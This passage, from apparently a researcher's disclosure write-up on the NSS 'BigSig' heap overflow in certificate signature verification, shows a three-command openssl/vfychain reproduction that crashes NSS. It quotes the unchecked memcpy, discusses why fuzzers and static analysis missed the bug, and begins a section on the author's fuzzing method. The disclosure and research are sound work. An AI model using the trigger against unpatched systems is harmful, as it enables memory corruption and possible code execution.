colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c5\"&gt;# We need 16384 bits to fill the buffer, then 32 + 64 + 64 + 64 bits to overflow to &lt;/span&gt;&lt;span class=\"c5\"&gt;hashobj&lt;/span&gt;&lt;span class=\"c5 c8\"&gt;, &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c5 c8\"&gt;# which contains function pointers (bigger would work too, but takes longer to generate).&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c21 c25\"&gt;$ openssl &lt;/span&gt;&lt;span class=\"c21 c25\"&gt;genpkey&lt;/span&gt;&lt;span class=\"c21 c25\"&gt;&amp;nbsp;-algorithm rsa-pss -pkeyopt rsa_keygen_bits:$((16384 + 32 + 64 + 64 + 64)) -pkeyopt rsa_keygen_primes:5 -out &lt;/span&gt;&lt;span class=\"c21 c25\"&gt;bigsig.key&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c5 c8\"&gt;# Generate a self-signed certificate from that key&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c8 c21 c36 c25\"&gt;$ openssl req -x509 -new -key bigsig.key -subj &amp;quot;/CN=BigSig&amp;quot; -sha256 -out bigsig.cer&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c5 c8\"&gt;# Verify it with NSS...&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c21 c25\"&gt;$ &lt;/span&gt;&lt;span class=\"c21 c25\"&gt;vfychain&lt;/span&gt;&lt;span class=\"c8 c21 c36 c25\"&gt;&amp;nbsp;-a bigsig.cer &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c8 c21 c25 c36\"&gt;Segmentation fault&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c29\"&gt;&lt;td class=\"c15\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c3 c33 c16 subtitle\" id=\"h.48dytsqrxb61\"&gt;&lt;span class=\"c32\"&gt;Fig 2&lt;/span&gt;&lt;span class=\"c30 c8\"&gt;. Reproducing the BigSig vulnerability in three easy commands.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span&gt;The actual code that does the corruption varies based on the algorithm; &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://searchfox.org/mozilla-central/rev/f8576fec48d866c5f988baaf1fa8d2f8cce2a82f/security/nss/lib/cryptohi/secvfy.c#477\"&gt;here is the code&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;for RSA-PSS. The bug is that there is simply no bounds checking at all; &lt;/span&gt;&lt;span class=\"c21\"&gt;sig&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"c21\"&gt;key&lt;/span&gt;&lt;span&gt;&amp;nbsp;are &amp;nbsp;arbitrary-length, attacker-controlled blobs, and &lt;/span&gt;&lt;span class=\"c21\"&gt;cx-&amp;gt;u&lt;/span&gt;&lt;span class=\"c11 c8\"&gt;&amp;nbsp;is a fixed-size buffer.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.5f5007590f34efd7a404c6d3f020f980f0b97070\"&gt;&lt;/a&gt;&lt;a id=\"t.2\"&gt;&lt;/a&gt;&lt;table class=\"c14\"&gt;&lt;tbody&gt;&lt;tr class=\"c29\"&gt;&lt;td class=\"c15\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c10\"&gt;case&lt;/span&gt;&lt;span class=\"c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c7\"&gt;rsaPssKey&lt;/span&gt;&lt;span class=\"c7 c8\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c8\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;sigLen = SECKEY_SignatureLen(key);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c10\"&gt;if&lt;/span&gt;&lt;span class=\"c7 c8\"&gt;&amp;nbsp;(sigLen == 0) {&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c21 c48\"&gt;/* error set by SECKEY_SignatureLen */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c8\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;rv = SECFailure;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c10\"&gt;break&lt;/span&gt;&lt;span class=\"c7 c8\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c8\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c31\"&gt;&lt;span class=\"c7 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c10\"&gt;if&lt;/span&gt;&lt;span class=\"c7 c8\"&gt;&amp;nbsp;(sig-&amp;gt;len != sigLen) {&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c8\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;PORT_SetError(SEC_ERROR_BAD_SIGNATURE);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c8\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;rv = SECFailure;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c10\"&gt;break&lt;/span&gt;&lt;span class=\"c7 c8\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c8\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c31\"&gt;&lt;span class=\"c7 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c8\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;PORT_Memcpy(cx-&amp;gt;u.buffer, sig-&amp;gt;data, sigLen);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c34\"&gt;&lt;span class=\"c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c10\"&gt;break&lt;/span&gt;&lt;span class=\"c7\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c29\"&gt;&lt;td class=\"c15\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c3 c33 c16 subtitle\" id=\"h.b383i7m17o2u\"&gt;&lt;span class=\"c32\"&gt;Fig 3&lt;/span&gt;&lt;span&gt;. The signature size must match the size of the key, but there are no other limitations. &lt;/span&gt;&lt;span class=\"c21\"&gt;cx-&amp;gt;u&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a fixed-size buffer, and &lt;/span&gt;&lt;span class=\"c21\"&gt;sig&lt;/span&gt;&lt;span class=\"c30 c8\"&gt;&amp;nbsp;is an arbitrary-length, attacker-controlled blob.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span class=\"c11 c8\"&gt;I think this vulnerability raises a few immediate questions:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c17 lst-kix_2fd9br43vo52-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c13 c27 li-bullet-0\"&gt;&lt;span&gt;Was this a recent code change or regression that hadn&amp;rsquo;t been around long enough to be discovered? &lt;/span&gt;&lt;span class=\"c32\"&gt;No&lt;/span&gt;&lt;span&gt;, the original code was &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://hg.mozilla.org/projects/nss/annotate/41f5eb9e5df23951883ba3243f3ae51550663d77/security/nss/lib/cryptohi/secvfy.c#l158\"&gt;checked in&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;with ECC support on the 17th October 2003, but wasn&amp;#39;t exploitable until some &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://hg.mozilla.org/projects/nss/diff/10393/security/nss/lib/cryptohi/seckey.c#l1.63\"&gt;refactoring&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;in June 2012. In 2017, RSA-PSS support was &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://hg.mozilla.org/projects/nss/rev/84e886ea090e36c69df58a71665a97bd25c62d02\"&gt;added&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c11 c8\"&gt;&amp;nbsp;and made the same error.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c17 lst-kix_81cegzboe9ky-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c13 c27 li-bullet-0\"&gt;&lt;span&gt;Does this bug require a long time to generate a key that triggers the bug? &lt;/span&gt;&lt;span class=\"c32\"&gt;No&lt;/span&gt;&lt;span&gt;, the example above generates a real key and signature, but it can just be garbage as the overflow happens before the signature check. A few kilobytes of &lt;/span&gt;&lt;span class=\"c21\"&gt;A&lt;/span&gt;&lt;span&gt;&amp;rsquo;s works just fine.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c17 lst-kix_2gk0zovl15u8-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c13 c27 li-bullet-0\"&gt;&lt;span&gt;Does reaching the vulnerable code require some complicated state that fuzzers and static analyzers would have difficulty synthesizing, like hashes or checksums? &lt;/span&gt;&lt;span class=\"c32\"&gt;No&lt;/span&gt;&lt;span&gt;, it has to &lt;/span&gt;&lt;span&gt;be well-formed&lt;/span&gt;&lt;span class=\"c11 c8\"&gt;&amp;nbsp;DER, that&amp;rsquo;s about it.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c17 lst-kix_z8xtsan2wa5s-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c13 c27 li-bullet-0\"&gt;&lt;span&gt;Is this an uncommon code path? &lt;/span&gt;&lt;span class=\"c32\"&gt;No&lt;/span&gt;&lt;span&gt;, Firefox does not use this code path for RSA-PSS signatures, but the default entrypoint for certificate verification in NSS, &lt;/span&gt;&lt;span class=\"c21\"&gt;CERT_VerifyCertificate(),&lt;/span&gt;&lt;span class=\"c11 c8\"&gt;&amp;nbsp;is vulnerable.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c17 lst-kix_oetzaqvyxxoa-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c13 c27 li-bullet-0\"&gt;&lt;span&gt;Is it specific to the RSA-PSS algorithm? &lt;/span&gt;&lt;span class=\"c32\"&gt;No&lt;/span&gt;&lt;span class=\"c11 c8\"&gt;, it also affects DSA signatures.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c17 lst-kix_prwgb47nvxz6-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c13 c27 li-bullet-0\"&gt;&lt;span&gt;Is it unexploitable, or otherwise limited impact? &lt;/span&gt;&lt;span class=\"c32\"&gt;No&lt;/span&gt;&lt;span&gt;, the &lt;/span&gt;&lt;span class=\"c21\"&gt;hashobj&lt;/span&gt;&lt;span class=\"c21\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;member can be clobbered. That object contains &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://searchfox.org/mozilla-central/rev/41a8c58186206985c0d70d3d460c04ac844d11d0/security/nss/lib/util/hasht.h#45\"&gt;function pointers&lt;/a&gt;&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&amp;nbsp;which are used immediately.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span class=\"c32\"&gt;This wasn&amp;rsquo;t a process failure, the vendor did everything right&lt;/span&gt;&lt;span&gt;. Mozilla has a mature, world-class security team. They pioneered &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://www.mozilla.org/en-US/security/bug-bounty/\"&gt;bug bounties&lt;/a&gt;&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;invest&lt;/span&gt;&lt;span&gt;&amp;nbsp;in &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://research.mozilla.org/rust/\"&gt;memory safety&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, fuzzing and &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://coverage.moz.tools/\"&gt;test coverage&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c11 c8\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span&gt;NSS was one of the very first projects included with &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://google.github.io/oss-fuzz/\"&gt;oss-fuzz&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, it was officially supported since at least &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://github.com/google/oss-fuzz/commit/3d325bf20f0b09961b6c7de34aa4da0d16cfa67d\"&gt;October 2014&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. Mozilla also fuzz NSS themselves with &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://llvm.org/docs/LibFuzzer.html\"&gt;libFuzzer&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, and have contributed their own &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://searchfox.org/mozilla-central/source/security/nss/fuzz/asn1_mutators.cc\"&gt;mutator&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;collection and distilled &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://github.com/mozilla/nss-fuzzing-corpus\"&gt;coverage corpus&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. There is an extensive testsuite, and nightly &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://firefox-source-docs.mozilla.org/tools/sanitizer/asan.html\"&gt;ASAN&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;builds.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span&gt;I&amp;#39;m generally skeptical of static analysis, but this seems like a simple missing bounds check that should be easy to find. Coverity has been monitoring NSS since at least &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://scan.coverity.com/projects/nss\"&gt;December 2008&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, and also &lt;/span&gt;&lt;span&gt;appears&lt;/span&gt;&lt;span class=\"c11 c8\"&gt;&amp;nbsp;to have failed to discover this.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span&gt;Until 2015, Google Chrome &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://chromium.googlesource.com/chromium/third_party/nss/+/refs/heads/master/README.chromium\"&gt;used&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;NSS, and maintained their own testsuite and fuzzing infrastructure independent of Mozilla. Today, Chrome platforms use &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://boringssl.googlesource.com/boringssl/\"&gt;BoringSSL&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c11 c8\"&gt;, but the NSS port is still maintained.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c17 lst-kix_ohd9cwgi2ci1-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c13 c27 li-bullet-0\"&gt;&lt;span&gt;Did Mozilla have good test coverage for the vulnerable areas? &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://coverage.moz.tools/#revision=latest&amp;path=security%2Fnss%2Flib%2Fcryptohi%2Fsecvfy.c&amp;suite=gtest&amp;view=file&amp;line=201\"&gt;YES&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c11 c8\"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c13 c27 li-bullet-0\"&gt;&lt;span&gt;Did Mozilla/chrome/oss-fuzz have relevant inputs in their fuzz corpus? &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://storage.googleapis.com/oss-fuzz-coverage/nss/reports/20211027/linux/src/nss/lib/cryptohi/secvfy.c.html#L201\"&gt;YES&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c11 c8\"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c13 c27 li-bullet-0\"&gt;&lt;span&gt;Is there a mutator capable of extending &lt;/span&gt;&lt;span&gt;ASN1_ITEM&lt;/span&gt;&lt;span&gt;s? &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://codereview.chromium.org/1677803002/patch/180001/190008\"&gt;YES&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c13 c27 li-bullet-0\"&gt;&lt;span&gt;Is this an &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://github.com/google/sanitizers/wiki/AddressSanitizerIntraObjectOverflow\"&gt;intra-object overflow&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, or other form of corruption that ASAN would have difficulty detecting? NO, it&amp;#39;s a textbook buffer overflow that ASAN can easily detect.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"c13 c16\" id=\"h.rdx8pm6yen5\"&gt;&lt;span class=\"c24 c8\"&gt;How did I find the bug?&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span class=\"c11 c8\"&gt;I&amp;#39;ve been experimenting with alternative methods for measuring code coverage, to see if any have any practical use in fuzzing. The fuzzer that discovered this vulnerability used a combination of two approaches, stack coverage and object isolation.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c13 c16\" id=\"h.j6f1q7cn6h69\"&gt;&lt;span class=\"c24 c8\"&gt;Stack Coverage&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span&gt;The most common method of measuring code coverage is block coverage, or &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://clang.llvm.org/docs/SanitizerCoverage.html#edge-coverage\"&gt;edge coverage&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;when source code is available. I&amp;rsquo;ve been curious if that is always sufficient. For example, consider a simple dispatch table with a combination of trusted and untrusted parameters, as in &lt;/span&gt;&lt;span class=\"c32\"&gt;Fig 4&lt;/span&gt;&lt;span class=\"c11 c8\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.bd548b01b21e1cf0cdd7eaa859aff19f6d0661e5\"&gt;&lt;/a&gt;&lt;a id=\"t.3\"&gt;&lt;/a&gt;&lt;table class=\"c14\"&gt;&lt;tbody&gt;&lt;tr class=\"c29\"&gt;&lt;td class=\"c15\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c23 c21\"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c23 c21\"&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c23 c21\"&gt;#include &amp;lt;limits.h&amp;gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1 c8\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c12\"&gt;static&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c12\"&gt;char&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;buf&lt;/span&gt;&lt;span class=\"c19\"&gt;[&lt;/span&gt;&lt;span class=\"c21 c51\"&gt;128&lt;/span&gt;&lt;span class=\"c19\"&gt;]&lt;/span&gt;&lt;span class=\"c23 c21\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1 c8\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c12\"&gt;void&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;cmd_handler_foo&lt;/span&gt;&lt;span class=\"c19\"&gt;(&lt;/span&gt;&lt;span class=\"c12\"&gt;int&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;a&lt;/span&gt;&lt;span class=\"c23 c21\"&gt;,&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c12\"&gt;size_t&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;b&lt;/span&gt;&lt;span class=\"c19\"&gt;)&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c19\"&gt;{&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c28 c21\"&gt;memset&lt;/span&gt;&lt;span class=\"c19\"&gt;(&lt;/span&gt;&lt;span class=\"c1\"&gt;buf&lt;/span&gt;&lt;span class=\"c23 c21\"&gt;,&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;a&lt;/span&gt;&lt;span class=\"c23 c21\"&gt;,&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;b&lt;/span&gt;&lt;span class=\"c19\"&gt;)&lt;/span&gt;&lt;span class=\"c23 c21\"&gt;;&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c19\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c12\"&gt;void&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;cmd_handler_bar&lt;/span&gt;&lt;span class=\"c19\"&gt;(&lt;/span&gt;&lt;span class=\"c12\"&gt;int&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;a&lt;/span&gt;&lt;span class=\"c23 c21\"&gt;,&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c12\"&gt;size_t&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;b&lt;/span&gt;&lt;span class=\"c19\"&gt;)&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c19\"&gt;{&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;cmd_handler_foo&lt;/span&gt;&lt;span class=\"c19\"&gt;(&lt;/span&gt;&lt;span class=\"c21 c38\"&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class=\"c23 c21\"&gt;,&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c12\"&gt;sizeof&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;buf&lt;/span&gt;&lt;span class=\"c19\"&gt;)&lt;/span&gt;&lt;span class=\"c23 c21\"&gt;;&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c19\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c12\"&gt;void&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;cmd_handler_baz&lt;/span&gt;&lt;span class=\"c19\"&gt;(&lt;/span&gt;&lt;span class=\"c12\"&gt;int&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;a&lt;/span&gt;&lt;span class=\"c23 c21\"&gt;,&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span 